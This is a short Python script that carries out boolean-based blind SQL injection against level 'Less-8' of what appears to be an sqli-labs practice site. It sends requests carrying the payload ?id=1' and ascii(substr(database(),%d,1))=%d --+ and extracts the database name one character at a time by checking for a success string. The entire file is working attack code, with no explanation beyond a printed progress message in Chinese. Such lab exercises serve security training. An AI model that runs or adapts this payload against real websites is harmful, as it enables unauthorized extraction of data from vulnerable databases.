import requests

url = "http://sqlilabs.njhack.xyz/Less-8/"

def get_dbname():
    db_name=''
    for i in range(1,9):
        for j in range(32,127):
            payload = "?id=1' and ascii(substr(database(),%d,1))=%d --+"%(i,j)
            url1 = url + payload
            res = requests.get(url1)
            if "You are in..........." in res.text:
                db_name += chr(j)
                print(chr(j))
                print("数据库名称为:"+db_name)
get_dbname()